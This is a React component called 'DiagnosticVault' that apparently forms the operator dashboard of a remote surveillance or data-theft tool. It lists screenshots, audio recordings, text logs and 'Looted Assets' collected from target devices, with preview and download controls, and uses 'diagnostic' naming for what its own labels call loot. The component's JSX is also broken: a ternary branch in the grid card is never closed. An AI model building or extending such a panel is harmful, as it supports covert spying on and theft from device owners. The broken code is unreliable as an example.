import { useState, useMemo } from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Table, TableHeader, TableBody, TableRow, TableHead, TableCell } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet";
import { ScrollArea } from "@/components/ui/scroll-area";
import { AspectRatio } from "@/components/ui/aspect-ratio";
import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group";
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Breadcrumb,
  BreadcrumbItem,
  BreadcrumbLink,
  BreadcrumbList,
  BreadcrumbPage,
  BreadcrumbSeparator,
} from "@/components/ui/breadcrumb";
import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";
import {
  Search,
  Download,
  Eye,
  FileImage,
  FileAudio,
  FileText,
  FolderArchive,
  Grid3X3,
  List,
  MoreVertical,
  Copy,
  Music,
  X,
  Monitor,
  ChevronDown,
  Folder,
  Layers,
  Briefcase, // Added Briefcase icon for loot
} from "lucide-react";
import { useTenant } from "@/hooks/use-tenant";
import { useDiagnosticFiles, DiagnosticEntry } from "@/hooks/use-diagnostic-files";
import { toast } from "@/hooks/use-toast";

type ViewMode = "grid" | "list";

// 1. Updated icons to include 'loot'
const typeIcons: Record<string, React.ReactNode> = {
  image: <FileImage className="h-4 w-4 text-primary" />,
  audio: <FileAudio className="h-4 w-4 text-[hsl(var(--warning))]" />,
  text: <FileText className="h-4 w-4 text-muted-foreground" />,
  loot: <Briefcase className="h-4 w-4 text-destructive" />,
};

// 2. Updated badge colors for 'loot'
const typeBadgeColors: Record<string, string> = {
  image: "bg-primary/10 text-primary border-primary/20",
  audio: "bg-[hsl(var(--warning))]/10 text-[hsl(var(--warning))] border-[hsl(var(--warning))]/20",
  text: "bg-muted text-muted-foreground border-border/50",
  loot: "bg-destructive/10 text-destructive border-destructive/20",
};

// 3. Updated category labels
const categoryLabels: Record<string, string> = {
  image: "Screenshots",
  audio: "Audio Recordings",
  text: "Text Logs",
  loot: "Looted Assets",
};

function getFileName(url: string) {
  return url.split("/").pop() || url;
}

function copyToClipboard(text: string) {
  navigator.clipboard.writeText(text);
  toast({ title: "Copied", description: "Resource link copied to clipboard." });
}

function downloadFile(url: string, name: string) {
  const a = document.createElement("a");
  a.href = url;
  a.download = name;
  a.target = "_blank";
  a.rel = "noopener noreferrer";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

/* ── Sub-components ── */

function AssetActions({ file }: { file: DiagnosticEntry }) {
  return (
    <DropdownMenu>
      <DropdownMenuTrigger asChild>
        <Button
          variant="ghost"
          size="icon"
          className="h-8 w-8 hover:bg-primary/10 hover:text-primary transition-colors"
        >
          <MoreVertical className="h-4 w-4" />
        </Button>
      </DropdownMenuTrigger>
      <DropdownMenuContent align="end" className="glass-card border-border/30">
        <DropdownMenuItem onClick={() => copyToClipboard(file.file_url)} className="gap-2 cursor-pointer">
          <Copy className="h-4 w-4" /> Copy Resource Link
        </DropdownMenuItem>
        <DropdownMenuItem
          onClick={() => downloadFile(file.file_url, getFileName(file.file_url))}
          className="gap-2 cursor-pointer"
        >
          <Download className="h-4 w-4" /> Download
        </DropdownMenuItem>
      </DropdownMenuContent>
    </DropdownMenu>
  );
}

function ImagePreviewDialog({
  file,
  open,
  onClose,
}: {
  file: DiagnosticEntry | null;
  open: boolean;
  onClose: () => void;
}) {
  if (!file) return null;
  return (
    <Dialog open={open} onOpenChange={(v) => !v && onClose()}>
      <DialogContent className="max-w-3xl glass-card border-border/30">
        <DialogHeader>
          <DialogTitle className="text-sm font-medium truncate">{getFileName(file.file_url)}</DialogTitle>
        </DialogHeader>
        <img
          src={file.file_url}
          alt={getFileName(file.file_url)}
          className="w-full rounded-lg object-contain max-h-[70vh]"
        />
        <p className="text-xs text-muted-foreground mt-2">
          Device: <span className="font-mono">{file.target_id}</span> · {new Date(file.created_at).toLocaleString()}
        </p>
      </DialogContent>
    </Dialog>
  );
}

function TextPreviewSheet({
  file,
  open,
  onClose,
}: {
  file: DiagnosticEntry | null;
  open: boolean;
  onClose: () => void;
}) {
  if (!file) return null;
  return (
    <Sheet open={open} onOpenChange={(v) => !v && onClose()}>
      <SheetContent className="glass-card border-border/30 w-full sm:max-w-lg">
        <SheetHeader>
          <SheetTitle className="text-sm font-medium truncate">{getFileName(file.file_url)}</SheetTitle>
        </SheetHeader>
        <div className="mt-4 flex flex-col gap-2">
          <p className="text-xs text-muted-foreground">
            Device: <span className="font-mono">{file.target_id}</span> · {new Date(file.created_at).toLocaleString()}
          </p>
          <ScrollArea className="h-[calc(100vh-10rem)] rounded-lg border border-border/30 bg-[hsl(var(--terminal-bg))] p-4">
            <iframe
              src={file.file_url}
              title={getFileName(file.file_url)}
              className="w-full min-h-[60vh] bg-transparent text-foreground"
              sandbox=""
            />
          </ScrollArea>
        </div>
      </SheetContent>
    </Sheet>
  );
}

function AudioPreviewDialog({
  file,
  open,
  onClose,
}: {
  file: DiagnosticEntry | null;
  open: boolean;
  onClose: () => void;
}) {
  if (!file) return null;
  return (
    <Dialog open={open} onOpenChange={(v) => !v && onClose()}>
      <DialogContent className="max-w-md glass-card border-border/30">
        <DialogHeader>
          <DialogTitle className="text-sm font-medium truncate">{getFileName(file.file_url)}</DialogTitle>
        </DialogHeader>
        <div className="flex flex-col items-center gap-4 py-6">
          <div className="h-20 w-20 rounded-2xl bg-[hsl(var(--warning))]/10 flex items-center justify-center">
            <Music className="h-10 w-10 text-[hsl(var(--warning))]" />
          </div>
          <audio controls className="w-full" src={file.file_url}>
            Your browser does not support audio playback.
          </audio>
          <p className="text-xs text-muted-foreground">
            Device: <span className="font-mono">{file.target_id}</span> · {new Date(file.created_at).toLocaleString()}
          </p>
        </div>
      </DialogContent>
    </Dialog>
  );
}

function AssetGridCard({ file, onPreview }: { file: DiagnosticEntry; onPreview: (f: DiagnosticEntry) => void }) {
  return (
    <Card
      className="glass-card group hover:border-primary/30 transition-all duration-300 overflow-hidden cursor-pointer"
      onClick={() => onPreview(file)}
    >
      <div className="relative">
        {file.type === "image" ? (
          <AspectRatio ratio={16 / 10}>
            <img
              src={file.file_url}
              alt={getFileName(file.file_url)}
              className="object-cover w-full h-full rounded-t-lg group-hover:scale-105 transition-transform duration-500"
            />
          </AspectRatio>
        ) : file.type === "audio" ? (
          <AspectRatio ratio={16 / 10}>
            <div className="w-full h-full flex items-center justify-center bg-[hsl(var(--warning))]/5 rounded-t-lg">
              <Music className="h-7 w-7 text-[hsl(var(--warning))]" />
            </div>
          </AspectRatio>
        ) : (
          /* Handle both text logs and looted files (like .docx) here */
          <AspectRatio ratio={16 / 10}>
            <div className="w-full h-full flex items-center justify-center bg-muted/20 rounded-t-lg">
              <div className="h-14 w-14 rounded-2xl bg-muted/30 flex items-center justify-center group-hover:scale-110 transition-transform duration-300">
                {file.type === "loot" ? (
                  <Briefcase className="h-7 w-7 text-destructive" />
                ) : (
                  <FileText className="h-7 w-7 text-muted-foreground" />
                )}
              </div>
            </div>
          </AspectRatio>
        <div className="absolute inset-0 bg-background/60 opacity-0 group-hover:opacity-100 transition-opacity duration-300 flex items-center justify-center gap-2 rounded-t-lg">
          <Button
            size="sm"
            variant="secondary"
            className="gap-1.5 text-xs"
            onClick={(e) => {
              e.stopPropagation();
              onPreview(file);
            }}
          >
            <Eye className="h-3.5 w-3.5" /> Preview
          </Button>
        </div>
      </div>
      <CardContent className="p-3 space-y-2">
        <div className="flex items-center justify-between">
          <p className="text-xs font-medium truncate max-w-[70%]">{getFileName(file.file_url)}</p>
          <AssetActions file={file} />
        </div>
        <div className="flex items-center gap-2">
          <Badge variant="outline" className={`${typeBadgeColors[file.type]} text-[10px] rounded-full`}>
            {file.type.toUpperCase()}
          </Badge>
          <span className="text-[10px] text-muted-foreground font-mono truncate">{file.target_id}</span>
        </div>
        <p className="text-[10px] text-muted-foreground/60">{new Date(file.created_at).toLocaleString()}</p>
      </CardContent>
    </Card>
  );
}

/* ── File category section (collapsible) ── */

function FileCategorySection({
  type,
  files,
  viewMode,
  onPreview,
}: {
  type: string;
  files: DiagnosticEntry[];
  viewMode: ViewMode;
  onPreview: (f: DiagnosticEntry) => void;
}) {
  const [open, setOpen] = useState(true);

  return (
    <Collapsible open={open} onOpenChange={setOpen}>
      <CollapsibleTrigger className="flex items-center gap-2 w-full p-3 rounded-lg hover:bg-muted/20 transition-colors group">
        <Folder className="h-4 w-4 text-primary" />
        <span className="text-sm font-semibold text-foreground">{categoryLabels[type] || type}</span>
        <Badge variant="outline" className="ml-1 text-[10px] rounded-full border-border/50">
          {files.length}
        </Badge>
        <ChevronDown
          className={`h-4 w-4 ml-auto text-muted-foreground transition-transform duration-200 ${open ? "" : "-rotate-90"}`}
        />
      </CollapsibleTrigger>
      <CollapsibleContent className="mt-2">
        {viewMode === "grid" ? (
          <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-4">
            {files.map((file) => (
              <AssetGridCard key={file.id} file={file} onPreview={onPreview} />
            ))}
          </div>
        ) : (
          <Card className="glass-card">
            <CardContent className="p-0">
              <Table>
                <TableHeader>
                  <TableRow className="border-border/30 hover:bg-transparent">
                    <TableHead className="text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">
                      File
                    </TableHead>
                    <TableHead className="hidden md:table-cell text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">
                      Device ID
                    </TableHead>
                    <TableHead className="hidden lg:table-cell text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">
                      Timestamp
                    </TableHead>
                    <TableHead className="text-right text-xs uppercase tracking-wider text-muted-foreground/60 font-semibold">
                      Actions
                    </TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {files.map((file) => (
                    <TableRow
                      key={file.id}
                      className="border-border/20 table-row-hover cursor-pointer"
                      onClick={() => onPreview(file)}
                    >
                      <TableCell>
                        <div className="flex items-center gap-2">
                          {typeIcons[file.type]}
                          <span className="text-sm font-medium truncate max-w-[200px]">
                            {getFileName(file.file_url)}
                          </span>
                        </div>
                      </TableCell>
                      <TableCell className="hidden md:table-cell font-mono text-sm text-muted-foreground">
                        {file.target_id}
                      </TableCell>
                      <TableCell className="hidden lg:table-cell text-sm text-muted-foreground">
                        {new Date(file.created_at).toLocaleString()}
                      </TableCell>
                      <TableCell className="text-right" onClick={(e) => e.stopPropagation()}>
                        <div className="flex items-center justify-end gap-1">
                          <Button
                            variant="ghost"
                            size="icon"
                            className="h-8 w-8 hover:bg-primary/10 hover:text-primary transition-colors"
                            onClick={() => onPreview(file)}
                          >
                            <Eye className="h-4 w-4" />
                          </Button>
                          <AssetActions file={file} />
                        </div>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </CardContent>
          </Card>
        )}
      </CollapsibleContent>
    </Collapsible>
  );
}

/* ── Main Component ── */

export default function DiagnosticVault() {
  const [search, setSearch] = useState("");
  const [viewMode, setViewMode] = useState<ViewMode>("grid");
  const [selectedDevice, setSelectedDevice] = useState<string | null>(null);

  const [imagePreview, setImagePreview] = useState<DiagnosticEntry | null>(null);
  const [textPreview, setTextPreview] = useState<DiagnosticEntry | null>(null);
  const [audioPreview, setAudioPreview] = useState<DiagnosticEntry | null>(null);

  const { data: tenant } = useTenant();
  const { data: liveFiles, isLoading } = useDiagnosticFiles(tenant?.tenantId);

  // Derive unique devices with counts
  const devices = useMemo(() => {
    const map = new Map<string, number>();
    (liveFiles || []).forEach((f) => map.set(f.target_id, (map.get(f.target_id) || 0) + 1));
    return Array.from(map.entries())
      .map(([id, count]) => ({ id, count }))
      .sort((a, b) => a.id.localeCompare(b.id));
  }, [liveFiles]);

  const totalCount = liveFiles?.length || 0;

  // Filter by selected device + search
  const filtered = useMemo(() => {
    return (liveFiles || []).filter((f) => {
      const matchesDevice = !selectedDevice || f.target_id === selectedDevice;
      const matchesSearch =
        f.target_id.toLowerCase().includes(search.toLowerCase()) ||
        f.file_url.toLowerCase().includes(search.toLowerCase());
      return matchesDevice && matchesSearch;
    });
  }, [liveFiles, selectedDevice, search]);

  // Group filtered files by type
  const groupedFiles = useMemo(() => {
    const groups: Record<string, DiagnosticEntry[]> = {};
    filtered.forEach((f) => {
      if (!groups[f.type]) groups[f.type] = [];
      groups[f.type].push(f);
    });
    return groups;
  }, [filtered]);

  // 4. Added 'loot' to category order
  const categoryOrder = ["image", "audio", "text", "loot"];
  const sortedCategories = categoryOrder.filter((t) => groupedFiles[t]?.length);

  // 5. Updated preview to handle 'loot' as a text sheet
function handlePreview(file: DiagnosticEntry) {
  if (file.type === "image") {
    setImagePreview(file);
  } else if (file.type === "audio") {
    setAudioPreview(file);
  } else if (file.type === "text") {
    setTextPreview(file);
  } else if (file.type === "loot") {
    // FIX: Instead of opening a broken preview, trigger download immediately
    downloadFile(file.file_url, getFileName(file.file_url));
    toast({ 
      title: "Downloading File", 
      description: `Starting download for: ${getFileName(file.file_url)}`,
    });
  }
}
  return (
    <div className="flex flex-col md:flex-row gap-4 h-full">
      <Card className="glass-card md:w-64 shrink-0">
        <CardContent className="p-3">
          <div className="flex items-center gap-2 mb-3 px-1">
            <Layers className="h-4 w-4 text-primary" />
            <span className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">Devices</span>
          </div>
          <ScrollArea className="md:h-[calc(100vh-16rem)]">
            <div className="flex md:flex-col gap-1 overflow-x-auto md:overflow-x-visible pb-1">
              <button
                onClick={() => setSelectedDevice(null)}
                className={`flex items-center gap-2 w-full px-3 py-2.5 rounded-lg text-left text-sm transition-all shrink-0 ${
                  selectedDevice === null
                    ? "bg-primary/10 border border-primary/30 text-foreground font-medium"
                    : "hover:bg-muted/20 text-muted-foreground border border-transparent"
                }`}
              >
                <FolderArchive className="h-4 w-4 shrink-0" />
                <span className="truncate">All Devices</span>
                <Badge variant="outline" className="ml-auto text-[10px] rounded-full border-border/50 shrink-0">
                  {totalCount}
                </Badge>
              </button>
              {devices.map((d) => (
                <button
                  key={d.id}
                  onClick={() => setSelectedDevice(d.id)}
                  className={`flex items-center gap-2 w-full px-3 py-2.5 rounded-lg text-left text-sm transition-all shrink-0 ${
                    selectedDevice === d.id
                      ? "bg-primary/10 border border-primary/30 text-foreground font-medium"
                      : "hover:bg-muted/20 text-muted-foreground border border-transparent"
                  }`}
                >
                  <Monitor className="h-4 w-4 shrink-0" />
                  <span className="truncate font-mono text-xs">{d.id}</span>
                  <Badge variant="outline" className="ml-auto text-[10px] rounded-full border-border/50 shrink-0">
                    {d.count}
                  </Badge>
                </button>
              ))}
            </div>
          </ScrollArea>
        </CardContent>
      </Card>

      <div className="flex-1 space-y-4 min-w-0">
        <Breadcrumb>
          <BreadcrumbList>
            <BreadcrumbItem>
              <BreadcrumbLink onClick={() => setSelectedDevice(null)} className="cursor-pointer">
                Explorer
              </BreadcrumbLink>
            </BreadcrumbItem>
            <BreadcrumbSeparator />
            <BreadcrumbItem>
              <BreadcrumbPage className="font-mono text-sm">{selectedDevice || "All Devices"}</BreadcrumbPage>
            </BreadcrumbItem>
          </BreadcrumbList>
        </Breadcrumb>

        <Card className="glass-card">
          <CardContent className="p-3">
            <div className="flex flex-col sm:flex-row gap-3 sm:items-center">
              <div className="relative flex-1 group">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground group-focus-within:text-primary" />
                <Input
                  placeholder="Search filename..."
                  value={search}
                  onChange={(e) => setSearch(e.target.value)}
                  className="pl-9 bg-muted/30 border-border/50"
                />
              </div>
              <ToggleGroup
                type="single"
                value={viewMode}
                onValueChange={(v) => v && setViewMode(v as ViewMode)}
                className="bg-muted/20 p-0.5 rounded-lg"
              >
                <ToggleGroupItem value="grid" className="h-8 w-8 rounded-md data-[state=on]:bg-primary">
                  <Grid3X3 className="h-4 w-4" />
                </ToggleGroupItem>
                <ToggleGroupItem value="list" className="h-8 w-8 rounded-md data-[state=on]:bg-primary">
                  <List className="h-4 w-4" />
                </ToggleGroupItem>
              </ToggleGroup>
            </div>
          </CardContent>
        </Card>

        {isLoading ? (
          <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-4">
            {[...Array(6)].map((_, i) => (
              <div key={i} className="h-56 rounded-xl bg-muted/20 shimmer" />
            ))}
          </div>
        ) : filtered.length === 0 ? (
          <Card className="glass-card py-16 text-center">
            <FolderArchive className="h-12 w-12 mx-auto text-muted-foreground/20 mb-4" />
            <p className="text-sm font-medium text-muted-foreground">No files found</p>
          </Card>
        ) : (
          <div className="space-y-4">
            {sortedCategories.map((type) => (
              <FileCategorySection
                key={type}
                type={type}
                files={groupedFiles[type]}
                viewMode={viewMode}
                onPreview={handlePreview}
              />
            ))}
          </div>
        )}
      </div>

      <ImagePreviewDialog file={imagePreview} open={!!imagePreview} onClose={() => setImagePreview(null)} />
      <TextPreviewSheet file={textPreview} open={!!textPreview} onClose={() => setTextPreview(null)} />
      <AudioPreviewDialog file={audioPreview} open={!!audioPreview} onClose={() => setAudioPreview(null)} />
    </div>
  );
}
